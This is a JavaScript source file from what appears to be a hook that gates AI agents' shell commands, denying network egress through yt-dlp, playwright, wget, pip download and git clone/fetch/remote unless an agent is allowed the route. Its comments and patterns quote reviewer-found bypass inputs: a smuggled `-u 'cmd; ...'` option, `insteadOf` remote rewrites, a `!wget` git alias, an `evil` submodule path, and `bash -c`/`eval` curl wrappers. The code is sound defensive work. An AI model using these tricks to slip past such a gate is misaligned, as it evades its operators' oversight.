  // level outside it (a group's output carries the text on): only a single `|` carries it, and a stage that
  // counts, hashes, compares or ships it ends the chain for good
  for (let l = levels.length - 1; l >= 0; l--) {
    const { stages, idx } = levels[l]
    for (let j = idx; j + 1 < stages.length; j++) {
      if (stages[j].sep !== '|') break
      const argv = words(stages[j + 1].text)
      const direct = stdinFedProgram(argv)
      if (direct) return direct
      const xs = xargsShellSink(argv)
      if (xs) return xs
      if (stageStopsPipe(argv)) return null
    }
  }
  return null
}
// ---- BYPASS ROUTES PER AGENT (card 521f1f39, owner Telegram 4554, 2026-10-14) ---------------------------------------
// The shell routes to the web that are NOT curl or an interpreter one-liner and that the name-and-shape list above never
// knew: yt-dlp, `npx playwright`, `git clone`, `git ls-remote`, wget, `pip download`. The owner decided them PER AGENT:
//   igor  : git clone (https, ssh) and npx playwright are allowed
//   willy : yt-dlp and npx playwright are allowed
//   zola, sam, ponder : all of them denied
//   the main agent : not covered (it is wired with --git-only, which skips every egress shape)
// INVERTED PROOF (the owner's standing rule 11, Telegram 4539): the default is DENY. A shape is allowed in exactly two cases:
// the agent is in BYPASS_ALLOW for it, or the call is PROVABLY without network (below). An agent that cannot be named
// (no transcript_path under <install>/agents/<name>/.claude-config/) has no allowance at all. Nothing here lists
// the forms of an attack; it lists what is allowed.
// WHO: the agent comes from the hook event's `transcript_path`, never from the cwd (a `cd` changes the cwd; the
// transcript lives under the session's own config root for its whole life). Same rule as destructive-gate.py and
// ledger_lib.agent_id_from_payload.
export const BYPASS_SHAPES = ['yt-dlp', 'playwright', 'git-clone', 'git-ls-remote', 'wget', 'pip-download']
export const BYPASS_ALLOW = Object.freeze({
  igor: Object.freeze(['git-clone', 'playwright']),
  willy: Object.freeze(['yt-dlp', 'playwright']),
})
const AGENT_ID_RE = /^[A-Za-z0-9][A-Za-z0-9_-]*$/
export function agentFromTranscript(path, root = ROOT) {
  if (typeof path !== 'string' || !path.trim()) return null
  const p = join('/', path.trim()).replace(/\\/g, '/')   // normalised, absolute
  const base = join(root, 'agents') + '/'
  if (!p.startsWith(base)) return null
  const parts = p.slice(base.length).split('/')   // parts[2] = the first segment UNDER the config dir; undefined or '' = nothing there
  if (!parts[2] || parts[1] !== '.claude-config' || !AGENT_ID_RE.test(parts[0])) return null
  return parts[0]
}
const BYPASS_TOOLS = new Map([
  ['yt-dlp', 'yt-dlp'], ['yt_dlp', 'yt-dlp'], ['youtube-dl', 'yt-dlp'], ['youtube_dl', 'yt-dlp'],
  ['playwright', 'playwright'], ['playwright-core', 'playwright'], ['@playwright/test', 'playwright'],
])
// Runners: they fetch and run a package by name, so the tool is a WORD AFTER the runner, not the command word.
const BYPASS_RUNNERS = new Set(['npx', 'pnpx', 'bunx', 'uvx', 'pipx', 'npm', 'pnpm', 'yarn', 'uv', 'bun', 'corepack'])
// `git clone` / `git ls-remote` are judged by an ALLOWLIST of options (the owner's rule 11, inverted proof; Sam 521f1f39 round 1,
// SULYOS 1: a list of options that take a value is a deny-list, and every option it did not know shifted the positional
// argument or ran a command: `--revision v1 URL`, `--bran main URL`, `-c url.X.insteadOf=file:///fake/`, `-u 'cmd; git-upload-pack'`).
// A call is network-free only when EVERY option is spelled out below (no abbreviation: git accepts `--bran`, the gate does not),
// the options in front of the subcommand are on a short list, and the remote is a PATH or a `file:///` URL.
// Valueless options of `git clone` that touch no network and run nothing.
const CLONE_FLAGS = new Set(['-q', '--quiet', '-v', '--verbose', '--progress', '-n', '--no-checkout', '--bare', '--mirror', '-l', '--local',
  '--no-local', '--no-hardlinks', '-s', '--shared', '--single-branch', '--no-single-branch', '--tags', '--no-tags', '--dissociate',
  '--sparse', '--reject-shallow', '--no-reject-shallow'])
const CLONE_SHORT_CLUSTER = new Set(['q', 'v', 'n', 'l', 's'])
// Options of `git clone` whose VALUE is a word or path and that cannot run a command or reach a network. (`--template` is NOT here: a template
// directory can carry hooks/post-checkout, which runs after the clone; Sam round 2, MEDIUM 3.)
const CLONE_VALUE = new Set(['-b', '--branch', '-o', '--origin', '--depth', '--separate-git-dir', '--revision', '--ref-format',
  '--reference', '--reference-if-able'])
// `git fetch` / `git pull` / `git archive --remote` / `git submodule add` / `git remote add|set-url` (HEX 3769): free only for a remote that is
// ALREADY NAMED (a word: origin, fork) or a local path, never for a URL literal; the options are an allowlist as well.
const FETCH_FLAGS = new Set(['-q', '--quiet', '-v', '--verbose', '-p', '--prune', '-P', '--prune-tags', '-t', '--tags', '--no-tags', '-n', '-f', '--force', '-a',
  '--append', '--all', '--no-all', '--dry-run', '--atomic', '--unshallow', '--update-shallow', '--no-recurse-submodules', '--auto-gc', '--no-auto-gc',
  '--progress', '--no-progress', '--porcelain'])
const FETCH_CLUSTER = new Set(['q', 'v', 'p', 'P', 't', 'n', 'f', 'a'])
const FETCH_VALUE = new Set(['--depth', '--deepen', '--jobs', '-j', '--shallow-since', '--shallow-exclude'])
const PULL_FLAGS = new Set([...FETCH_FLAGS, '--ff', '--ff-only', '--no-ff', '--rebase', '--no-rebase', '--no-edit', '--commit', '--no-commit', '--squash',
  '--no-squash', '--autostash', '--no-autostash', '--stat', '--no-stat'])
const PULL_VALUE = new Set([...FETCH_VALUE, '-s', '--strategy', '-X', '--strategy-option'])
const ARCHIVE_FLAGS = new Set(['-l', '--list', '-v', '--verbose', '--worktree-attributes'])
const ARCHIVE_VALUE = new Set(['--remote', '--format', '-o', '--output', '--prefix', '--add-file', '--add-virtual-file'])
const SUBMODULE_ADD_FLAGS = new Set(['-q', '--quiet', '-f', '--force'])
const SUBMODULE_ADD_VALUE = new Set(['-b', '--branch', '--name', '--depth', '--reference'])
const REMOTE_ADD_FLAGS = new Set(['-f', '--tags', '--no-tags', '--push', '--add', '--delete'])
const REMOTE_ADD_VALUE = new Set(['-t', '-m', '--mirror'])
// A remote that is already NAMED (origin, fork) is a configured address, not a new one; a local path is no download either.
function remoteSpecFree(r) {
  if (!r || /[$`]|\$\(subst\)/.test(r)) return false
  if (/^[A-Za-z0-9][\w.-]*$/.test(r)) return true
  return remoteIsLocal(r, false)
}
const LSREMOTE_FLAGS = new Set(['-q', '--quiet', '-t', '--tags', '-h', '--heads', '--refs', '--symref', '--get-url', '--exit-code'])
const LSREMOTE_SHORT_CLUSTER = new Set(['q', 't', 'h'])
const LSREMOTE_VALUE = new Set(['--sort'])
// A config key whose VALUE makes a later git call download from somewhere else: `url.<base>.insteadOf` rewrites a "local" remote, `alias.<n>`
// is any command (`!wget ...` included), `remote.<n>.url` names a new remote, `core.sshCommand` runs a command. Written to a config FILE it is
// the same effect as the `-c` form the options allowlist already refuses (Sam round 2, MEDIUM 4).
const CONFIG_REDIRECT_KEY = /^(?:url\..+\.(?:push)?insteadof|alias\..+|remote\..+\.(?:push)?url|core\.sshcommand|core\.gitproxy)$/i
const GIT_BUILTINS = new Set(['add', 'am', 'annotate', 'apply', 'archive', 'backfill', 'bisect', 'blame', 'branch', 'bugreport', 'bundle', 'cat-file', 'check-attr', 'check-ignore', 'check-mailmap', 'check-ref-format', 'checkout', 'checkout--worker', 'checkout-index', 'cherry', 'cherry-pick', 'citool', 'clean', 'clone', 'column', 'commit', 'commit-graph', 'commit-tree', 'config', 'count-objects', 'credential', 'credential-cache', 'credential-cache--daemon', 'credential-store', 'daemon', 'describe', 'diagnose', 'diff', 'diff-files', 'diff-index', 'diff-pairs', 'diff-tree', 'difftool', 'difftool--helper', 'fast-export', 'fast-import', 'fetch', 'fetch-pack', 'filter-branch', 'fmt-merge-msg', 'for-each-ref', 'for-each-repo', 'format-patch', 'fsck', 'fsck-objects', 'fsmonitor--daemon', 'gc', 'get-tar-commit-id', 'grep', 'gui', 'hash-object', 'help', 'hook', 'http-backend', 'http-fetch', 'http-push', 'imap-send', 'index-pack', 'init', 'init-db', 'instaweb', 'interpret-trailers', 'last-modified', 'log', 'ls-files', 'ls-remote', 'ls-tree', 'mailinfo', 'mailsplit', 'maintenance', 'merge', 'merge-base', 'merge-file', 'merge-index', 'merge-octopus', 'merge-one-file', 'merge-ours', 'merge-recursive', 'merge-recursive-ours', 'merge-recursive-theirs', 'merge-resolve', 'merge-subtree', 'merge-tree', 'mergetool', 'mktag', 'mktree', 'multi-pack-index', 'mv', 'name-rev', 'notes', 'p4', 'pack-objects', 'pack-redundant', 'pack-refs', 'patch-id', 'pickaxe', 'prune', 'prune-packed', 'pull', 'push', 'quiltimport', 'range-diff', 'read-tree', 'rebase', 'receive-pack', 'reflog', 'refs', 'remote', 'remote-ext', 'remote-fd', 'remote-ftp', 'remote-ftps', 'remote-http', 'remote-https', 'repack', 'replace', 'replay', 'repo', 'request-pull', 'rerere', 'reset', 'restore', 'rev-list', 'rev-parse', 'revert', 'rm', 'send-email', 'send-pack', 'sh-i18n--envsubst', 'shell', 'shortlog', 'show', 'show-branch', 'show-index', 'show-ref', 'sparse-checkout', 'stage', 'stash', 'status', 'stripspace', 'submodule', 'submodule--helper', 'subtree', 'svn', 'switch', 'symbolic-ref', 'tag', 'unpack-file', 'unpack-objects', 'update-index', 'update-ref', 'update-server-info', 'upload-archive', 'upload-archive--writer', 'upload-pack', 'var', 'verify-commit', 'verify-pack', 'verify-tag', 'version', 'web--browse', 'whatchanged', 'worktree', 'write-tree'])
function isUrlLiteral(w) {
  const x = String(w ?? '')
  return /^[a-z][a-z0-9+.-]*:\/\//i.test(x) || /^(?:[^@\/\s:]+@)?[A-Za-z0-9.-]+:(?!\/\/)[^\s]/.test(x)
}
// Options in front of the subcommand (`git <these> clone`). `-c` and `--config-env` are NOT here: `-c url.<x>.insteadOf=` rewrites a
// "local" remote to an external one, `-c core.sshCommand=` runs a command. `-C <dir>` only changes the directory.
const GIT_GLOBAL_NETFREE = new Set(['--no-pager', '-P', '--paginate', '-p', '--no-optional-locks', '--no-replace-objects', '--no-lazy-fetch'])
const NETFREE_FLAGS = new Set(['--version', '-V', '--help', '-h'])
const baseName = (w) => String(w ?? '').split('/').pop().replace(/\.exe$/i, '')
// The tool name of a word given to a runner: `playwright@1.50`, `playwright`, `@playwright/test@latest`, `--package=playwright`,
// and the words of a quoted `-c 'playwright install chromium'` body.
function toolOf(word) {
  const w = String(word ?? '').toLowerCase().replace(/^(?:--package=|-p=?)/, '')
  const noVer = w.startsWith('@') ? w.replace(/^(@[^/@]+\/[^/@]+)@.*$/, '$1') : w.replace(/@[^/@]*$/, '')
  return BYPASS_TOOLS.get(noVer) ?? null
}
function toolInWords(word) {
  const w = String(word ?? '')
  const one = toolOf(w)
  if (one) return one
  if (!/\s/.test(w)) return null
  for (const piece of w.split(/\s+/)) { const t = toolOf(piece); if (t) return t }
  return null
}
// `python3 -m pip`, `python3 -mpip`, `python3 -Im pip`, `python3 -X dev -m yt_dlp`: the module is the command. Returns the rest of the
// argv from the module word on, or null (a script, `-c`, no `-m`).
function pythonModule(rest) {
  for (let k = 0; k < rest.length; k++) {
    const a = rest[k]
    if (a === '--') return null
    if (a.startsWith('--')) { if (/^--(?:check-hash-based-pycs)$/.test(a)) k++; continue }
    if (!a.startsWith('-') || a === '-') return null           // the script path: stop
    for (let j = 1; j < a.length; j++) {
      const ch = a[j]
      if (ch === 'm') { const attached = a.slice(j + 1); return attached ? [attached, ...rest.slice(k + 1)] : (k + 1 < rest.length ? rest.slice(k + 1) : null) }
      if (ch === 'c') return null                                // code, not a module
      if (ch === 'W' || ch === 'X') { if (j === a.length - 1) k++; break }   // takes a value (attached or the next word)
    }
  }
  return null
}
// pip's global options that take their value as the NEXT word. A name this table does not know is the case the card exists for:
// then ANY later word `download` / `wheel` counts, never the first non-option word.
const PIP_GLOBAL_VALUE = new Set(['--proxy', '--cache-dir', '--log', '--retries', '--timeout', '--exists-action', '--trusted-host', '--cert',
  '--client-cert', '--python', '--keyring-provider', '--use-feature', '--use-deprecated', '--isolated-env'])
const PIP_KNOWN_FLAG = /^(?:-[qvV]+|--(?:quiet|verbose|isolated|no-input|no-cache-dir|disable-pip-version-check|require-virtualenv|debug|no-color|help|version)|--[\w-]+=.*)$/
const PIP_FETCHING = new Set(['download', 'wheel'])
// Which bypass shape does this command (argv[0] = the command word) belong to? { shape, args, globals } or null.
// `args` are the words after the tool / subcommand. Wrappers (env, timeout, sudo, ...) are skipped by commandIndex
// before this is called; `bash -c` bodies reach classify() again and are judged there.
export function bypassShapeOf(argv) {
  const w = argv.slice()
  let c = baseName(w[0]).toLowerCase()
  if (!c) return null
  let rest = w.slice(1)
  // python -m <module> : the module is the command (python3 -m pip download, python -m yt_dlp, python -m playwright)
  if (/^python[\d.]*$/.test(c)) {
    const m = pythonModule(rest)
    if (!m) return null
    c = baseName(m[0]).toLowerCase().split('.')[0]; rest = m.slice(1)         // `pip.__main__` is `pip`, `yt_dlp.__main__` is `yt_dlp`
  }
  if (BYPASS_TOOLS.has(c)) return { shape: BYPASS_TOOLS.get(c), args: rest }
  if (c === 'wget' || c === 'wget2') return { shape: 'wget', args: rest }
  if (/^pip[\d.]*$/.test(c)) {
    // find the pip subcommand with the known value-taking globals; an option this table does not know could take a value, so then
    // any later word `download` / `wheel` counts
    let unknownOpt = false
    for (let i = 0; i < rest.length; i++) {
      const x = rest[i]
      if (x.startsWith('-')) {
        if (PIP_GLOBAL_VALUE.has(x)) { i++; continue }
        if (PIP_KNOWN_FLAG.test(x)) continue
        unknownOpt = true
        continue
      }
      if (PIP_FETCHING.has(x)) return { shape: 'pip-download', args: rest.slice(i + 1) }
      if (!unknownOpt) return null                           // the subcommand is something else, and nothing before it could hide a value
    }
    if (unknownOpt) {
      const j = rest.findIndex((x) => PIP_FETCHING.has(x))
      if (j !== -1) return { shape: 'pip-download', args: rest.slice(j + 1) }
    }
    return null
  }
  if (BYPASS_RUNNERS.has(c)) {
    const pk = rest.findIndex((x) => /^pip[\d.]*$/.test(baseName(x)))
    if (pk !== -1) {
      const inner = bypassShapeOf(rest.slice(pk))
      if (inner) return inner
    }
    const i = rest.findIndex((x) => toolInWords(x))
    return i === -1 ? null : { shape: toolInWords(rest[i]), args: rest.slice(i + 1) }
  }
  if (c === 'git') {
    let i = 0
    for (; i < rest.length; i++) {
      const x = rest[i]
      if (!x.startsWith('-')) break
      if (x === '-c' || x === '-C' || x === '--git-dir' || x === '--work-tree' || x === '--namespace' || x === '--super-prefix' || x === '--config-env' || x === '--exec-path') i++
    }
    const sub = rest[i]
    const globals = rest.slice(0, i)
    if (sub === 'config') {
      const a = rest.slice(i + 1)
      const read = a.some((x) => /^(?:--get|--get-all|--get-regexp|--get-urlmatch|--unset|--unset-all|--list|-l|--edit|-e|--name-only|--show-origin)$/.test(x))
      const pos = a.filter((x) => !x.startsWith('-'))
      const k = pos.findIndex((x) => CONFIG_REDIRECT_KEY.test(x))
      if (!read && k !== -1 && pos.length > k + 1) return { shape: 'git-clone', args: a, globals, via: 'config-write' }
    }
    if (sub === 'clone') return { shape: 'git-clone', args: rest.slice(i + 1), globals }
    if (sub === 'ls-remote') return { shape: 'git-ls-remote', args: rest.slice(i + 1), globals }
    // The same download without the word `clone` (HEX 3769): judged as the git-clone shape, so the per-agent table decides.
    if (sub === 'fetch' || sub === 'pull' || sub === 'archive') return { shape: 'git-clone', args: rest.slice(i + 1), globals, via: sub }
    if (sub === 'submodule' || sub === 'remote') {
      const j = rest.findIndex((x, k) => k > i && !x.startsWith('-'))
      const verb = j === -1 ? null : rest[j]
      if (sub === 'submodule' && verb === 'add') return { shape: 'git-clone', args: rest.slice(j + 1), globals, via: 'submodule-add' }
      if (sub === 'submodule' && verb === 'set-url') return { shape: 'git-clone', args: rest.slice(j + 1), globals, via: 'submodule-set-url' }
      if (sub === 'remote' && (verb === 'add' || verb === 'set-url')) return { shape: 'git-clone', args: rest.slice(j + 1), globals, via: 'remote-' + verb }
    }
    if (sub && !sub.startsWith('-') && !GIT_BUILTINS.has(sub)) {
      // not a git builtin: an alias (`git config alias.dl clone`; `git dl URL`) or an external command. With a URL literal in its
      // arguments it is the clone shape; without one nothing is known (Sam round 2, MEDIUM 4).
      if (rest.slice(i + 1).some(isUrlLiteral)) return { shape: 'git-clone', args: rest.slice(i + 1), globals, via: 'alias' }
    }
  }
  return null
}
// Is the remote of a clone / ls-remote a LOCAL PATH (or a `file:///` URL) by its literal spelling? Only those: a loopback http/ssh
// remote still goes through the proxy / ssh environment, and `host:path` is ssh. `ls-remote` treats a bare word as a NAMED REMOTE
// (network), `clone` as a path.
function remoteIsLocal(r, bareIsPath) {
  if (!r || /[$`]|\$\(subst\)/.test(r)) return false
  if (/^file:\/\/\//i.test(r)) return true
  if (/^[a-z][a-z0-9+.-]*:/i.test(r) && !r.startsWith('/') && !r.startsWith('.')) return false   // any other scheme, or scp-like host:path
  if (/^(?:\/|\.\/|\.\.\/|~|\.$|\.\.$)/.test(r)) return true
  return bareIsPath && !/^[^/]*:/.test(r)
}
// `git submodule add ./x` and `../x` are resolved against the superproject's ORIGIN url, not the file system (Sam round 2, SEVERE 1: with an
// http origin, `../../evil/x.git` is fetched from that host). Only an absolute path and file:/// are local.
function remoteIsAbsoluteLocal(r) {
  if (!r || /[$`]|\$\(subst\)/.test(r)) return false
  return /^file:\/\/\//i.test(r) || r.startsWith('/')
}
// The words of a git global-option list are acceptable when each is on the short list (`-C <dir>` takes a value).
function gitGlobalsNetFree(globals) {
  for (let i = 0; i < globals.length; i++) {
    const x = globals[i]
    if (x === '-C') { i++; continue }
    if (!GIT_GLOBAL_NETFREE.has(x)) return false
  }
  return true
}
// Reads the options of clone / ls-remote against the allowlist; returns the positional words, or null when ANY option is not known.
function gitPositionals(args, flags, cluster, valued) {
  const pos = []
  let rest = false
  for (let i = 0; i < args.length; i++) {
    const x = args[i]
    if (rest || !x.startsWith('-') || x === '-') { pos.push(x); continue }
    if (x === '--') { rest = true; continue }
    if (x.startsWith('--')) {
      const eq = x.indexOf('=')
      const name = eq === -1 ? x : x.slice(0, eq)
      if (valued.has(name)) { if (eq === -1) i++; continue }
      if (eq === -1 && flags.has(x)) continue
      return null
    }
    if (flags.has(x)) continue
    if (valued.has(x)) { i++; continue }
    if (/^-[A-Za-z]$/.test(x) === false && valued.has(x.slice(0, 2))) continue          // -bmain
    if ([...x.slice(1)].every((ch) => cluster.has(ch))) continue                          // -qn
    return null
  }
  return pos
}
// PROVABLY without network: only then does a bypass shape stay silent for an agent that is not allowed it.
function bypassNetFree({ shape, args: argsIn, globals, via }) {
  const args = stripRedirections(argsIn)       // `git clone -q /a/b c 2>&1`: a redirection word is not a positional argument
  if ((shape === 'git-clone' || shape === 'git-ls-remote') && gitGlobalsNetFree(globals ?? []) && args.length > 0 && !via?.match(/^(alias|config-write)$/) &&
      args.every((x) => x === '--help' || (x === '-h' && shape !== 'git-ls-remote'))) return true
  if (via) {
    if (!gitGlobalsNetFree(globals ?? [])) return false
    if (via === 'fetch' || via === 'pull') {
      const pos = gitPositionals(args, via === 'fetch' ? FETCH_FLAGS : PULL_FLAGS, FETCH_CLUSTER, via === 'fetch' ? FETCH_VALUE : PULL_VALUE)
      return !!pos && (pos.length === 0 || remoteSpecFree(pos[0]))
    }
    if (via === 'archive') {
      const hasRemote = args.some((x) => x.startsWith('--r'))
      const pos = gitPositionals(args, ARCHIVE_FLAGS, new Set(['l', 'v']), ARCHIVE_VALUE)
      if (!pos) return false
      if (!hasRemote) return true
      const k = args.findIndex((x) => x === '--remote' || x.startsWith('--remote='))
      if (k === -1) return false                                 // `--rem...`: an abbreviation the allowlist does not spell out
      const v = args[k] === '--remote' ? args[k + 1] : args[k].slice('--remote='.length)
      return remoteSpecFree(v)
    }
    if (via === 'alias' || via === 'config-write') return false
    if (via === 'submodule-add') {
      const pos = gitPositionals(args, SUBMODULE_ADD_FLAGS, new Set(['q', 'f']), SUBMODULE_ADD_VALUE)
      return !!pos && pos.length >= 1 && pos.length <= 2 && remoteIsAbsoluteLocal(pos[0])
    }
    if (via === 'submodule-set-url') {
      const pos = gitPositionals(args, new Set(), new Set(), new Set())
      return !!pos && pos.length === 2 && remoteIsAbsoluteLocal(pos[1])
    }
    if (via === 'remote-add' || via === 'remote-set-url') {
      const pos = gitPositionals(args, REMOTE_ADD_FLAGS, new Set(['f']), REMOTE_ADD_VALUE)
      return !!pos && pos.length === 2 && remoteIsLocal(pos[1], true)
    }
    return false
  }
  if (shape === 'git-clone' || shape === 'git-ls-remote') {
    if (!gitGlobalsNetFree(globals ?? [])) return false
    const clone = shape === 'git-clone'
    const pos = gitPositionals(args, clone ? CLONE_FLAGS : LSREMOTE_FLAGS, clone ? CLONE_SHORT_CLUSTER : LSREMOTE_SHORT_CLUSTER, clone ? CLONE_VALUE : LSREMOTE_VALUE)
    if (!pos || pos.length === 0) return false
    if (clone && pos.length > 2) return false
    return remoteIsLocal(pos[0], clone)
  }
  const a = stripRedirections(args)
  return a.length > 0 && a.every((x) => NETFREE_FLAGS.has(x))
}
// `wget --version 2>&1 | head` : the redirection words are not arguments of the tool. A bare operator (`>`, `2>`)
// takes the next word with it; an attached one (`2>&1`, `>/dev/null`) is one word.
function stripRedirections(args) {
  const out = []
  for (let i = 0; i < args.length; i++) {
    const x = args[i]
    if (/^\d*(?:>>?|<|&>)$/.test(x)) { i++; continue }
    if (/^\d*(?:>>?|<|&>)/.test(x)) continue
    out.push(x)
  }
  return out
}
// `command -v yt-dlp` / `command -V wget` PRINTS where a command is; commandIndex skips `command` and its option, so the
// looked-up name stands where the command word would. It is not a run: no network.
function isCommandLookup(argv, ci) {
  for (let k = 0; k < ci; k++) {
    if (baseName(argv[k]) !== 'command') continue
    if (argv.slice(k + 1, ci).some((o) => /^-[A-Za-z]*[vV]/.test(o))) return true
  }
  return false
}
// null = nothing to say; otherwise the deny verdict for this stage.
export function bypassVerdict(argv, agent) {
  const b = bypassShapeOf(argv)
  if (!b) return null
  if (agent && (BYPASS_ALLOW[agent] ?? []).includes(b.shape)) return null
  if (bypassNetFree(b)) return null
  return { deny: true, reason: `bypass-${b.shape}`, hosts: [], agent: agent ?? null }
}
export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), gitOnly = false, inherit = NO_BINDINGS) {
  const hit = (r) => r.deny && (!gitOnly || isGitReason(r.reason))
  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
  const { stripped: orig, inners, herestrings, regions } = liftSubstitutions(norm)
  const masked = maskInertLiterals(orig)
  const parseable = masked !== null && masked.length === orig.length
  const env = parseable ? { ...inherit.env, ...collectAssignments(orig, masked, norm) } : inherit.env
  const loops = parseable ? mergeLoops(inherit.loops, collectLoops(orig, masked, env)) : mergeLoops(inherit.loops, {})
  if (depth < 4) {
    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, gitOnly, { env, loops, agent: inherit.agent }); if (hit(r)) return r }
  }
  if (!parseable) return { deny: false, reason: 'unparseable', hosts: [] }
  const feeds = stdinFeeds(orig, masked, herestrings, env)
  // A `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to
  // the fed lines in the same command, exactly like `for u in URL`: the values join the loop values.
  const reads = collectReads(orig, masked)
  for (const f of reads.length ? feeds : []) {
    const c = commandWordAt(masked, f.at)
    if (c !== 'done' && c !== 'read') continue
    const text = f.expands ? expand(f.text, env) : f.text
    for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
  }
  // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
  // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
  // shell interpreter's body is a command line of its own, so it gets the whole analysis.
  for (const f of feeds) {
    let cmd = commandWordAt(masked, f.at)
    let shell = cmd !== null && SHELL.test(cmd)
    if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) {
      // Not read by a shell or interpreter directly: does the text still end up as one's program?
      const sink = codeSinkOf(orig, masked, f.at, feeds.filter((x) => x.bodyStart != null))
      if (sink) { cmd = sink; shell = SHELL.test(sink) }
    }
    if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) {
      // A heredoc that is DATA for cat / tee / curl --data-binary @- / a message script is text, not code:
      // it is not judged, a quoted `curl https://...` line in it included (EGRESSQUOTED1013 denied that in
      // the full mode; owner decision Telegram 4457, 2026-10-13, narrowed it to heredocs that RUN as code,
      // because a quoted line in text is a message, not a call).
      continue
    }
    const plain = f.expands ? expand(f.text, env) : f.text
    const variants = f.expands ? loopVariants(f.text, env, loops) : []
    for (const text of [plain, ...(variants ?? [])]) {
      if (shell) {
        if (depth >= 4) break
        const r = classify(text, depth + 1, vendorHosts, vendorDomains, gitOnly, { env: {}, loops: {}, agent: inherit.agent })
        if (hit(r)) return { ...r, reason: `heredoc-${r.reason}` }
        continue
      }
      if (gitOnly || !(PYTHON.test(cmd.toLowerCase()) ? pythonUsesNetwork(text) : usesNetwork(cmd, text))) continue
      const found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: 'heredoc-external', hosts }
    }
    if (variants === null && !gitOnly) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
  }
  let prevSpan = null
  let prevEnd = 0
  for (const [a, b] of spans(masked)) {
    // the span before this one, when it is joined to this one by a single `|` (see pipedShellBody)
    const before = prevSpan && masked.slice(prevEnd, a) === '|' ? prevSpan : null
    prevEnd = b
    prevSpan = { argv: shellWords(orig.slice(a, b)) }
    const mw = words(masked.slice(a, b))
    const i = commandIndex(mw)
    if (i >= mw.length) continue
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged.
    // A lifted $( ... ) / backtick is blank in `orig`; here it is the word-part `$(subst)`, so a command
    // word or a destination that IS a substitution stays visible as unreadable (EGRESSWRAP1009).
    const seg = withSubstitutionMarks(orig, regions, a, b)
    const plain = expand(seg, env)
    const variants = loopVariants(seg, env, loops)
    for (const [reading, text] of [plain, ...(variants ?? [])].entries()) {
      const argv = shellWords(text)
      // The command word, after the variables are expanded: `c=curl; $c https://x` runs curl.
      const ci = commandIndex(argv)
      const head = argv[ci] ?? ''
      // The command is read from the ORIGINAL words (a quoted "git", \\git, git.exe or a quoted path
      // are blanked in the masked text and would be missed), but only where the span STARTS live: a
      // span can carry a heredoc body's text in its original form (the body's own newline is
      // blanked, so it merges into the next span), and that body is inert unless it is stdin to a
      // shell, which the feeds pass above already judges. A blanked region holding a newline in the
      // original is such a body; a blanked quoted word is not.
      const lead = masked.slice(a, b).match(/^\s*/)[0].length
      const liveStart = !/\n/.test(orig.slice(a, a + lead))
      // The command word as the shell will run it. The masked words blank a QUOTED word, so `"curl" URL`
      // and `c=curl; "$c" URL` showed the URL as the command (EGRESSWRAP1009): where the span starts live,
      // the expanded, unquoted word wins when it is readable.
      let cmd = mw[i].split('/').pop()
      let cmdArgs = mw.slice(i + 1)
      if (liveStart && head !== '' && !OPAQUE_WORD.test(head)) {
        const h = head.replace(/^[({]+(?=.)/, '').split('/').pop().replace(/\.exe$/i, '')
        if (h !== cmd) { cmd = h; cmdArgs = argv.slice(ci + 1) }
      }
      const force = liveStart ? gitForcePush(argv) : null
      if (force) return { deny: true, reason: force, hosts: [] }
      const body = depth < 4 && liveStart ? (shellBody(argv) ?? pipedShellBody(before, argv)) : null
      // bash -c / sh -c / eval BODY: a command line of its own, judged like any other (with the caller's
      // gitOnly, so the main agent's git-only wiring still sees nothing but the push). It was judged for
      // git ALONE, so `bash -c 'curl -s https://example.org/'` and `eval curl URL` passed (Sam, card 55d8cd24).
      // A wrapper whose body is a substitution (`eval "$(echo curl URL)"`, `bash -c "$(...)"`): the body is
      // built at run time and cannot be read, but the substitution's own text can. An external URL in it
      // is a deny; a substitution with no URL (`eval "$(ssh-agent -s)"`, `bash -c "$(cat run.sh)"`) stays
      // open and is named in the header.
      if (body && !gitOnly && liveStart && body.includes('$(subst)')) {
        const mine = regions.map((r, k) => [r, inners[k]]).filter(([r]) => r[0] >= a && r[1] <= b).map(([, t]) => expand(t, env))
        const hosts = [...new Set(mine.flatMap((t) => [...t.matchAll(URL_RE)].map((m) => m[0])).filter(isExternal).map(hostOf))]
          .filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
        if (hosts.length) return { deny: true, reason: 'wrapper-substitution-external', hosts }
      }
      if (body) {
        // the force-push first, as before: a body with a curl AND a push reports the push
        const rg = classify(body, depth + 1, vendorHosts, vendorDomains, true, { env, loops, agent: inherit.agent }); if (rg.deny) return rg
        if (!gitOnly) { const r = classify(body, depth + 1, vendorHosts, vendorDomains, false, { env, loops, agent: inherit.agent }); if (r.deny) return r }
      }
      // OPAQUE command word: a variable nobody set, or a substitution, stands where the command should.
      // It can be curl, so the line is judged by what it carries: an external URL in it is a deny.
      if (!gitOnly && liveStart && OPAQUE_WORD.test(head)) {
        const hosts = [...new Set([...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf))]
          .filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
        if (hosts.length) return { deny: true, reason: 'command-unresolved', hosts }
      }
      // BYPASS ROUTES PER AGENT (521f1f39): yt-dlp, npx playwright, git clone / ls-remote, wget, pip download.
      // Deny unless the agent is allowed the shape or the call is provably without network. Not in --git-only.
      if (!gitOnly && liveStart && !isCommandLookup(argv, ci)) {
        const bv = bypassVerdict(argv.slice(ci), inherit.agent)
        if (bv) return bv
      }
      let target = null
      if (cmd === 'curl') target = 'curl'
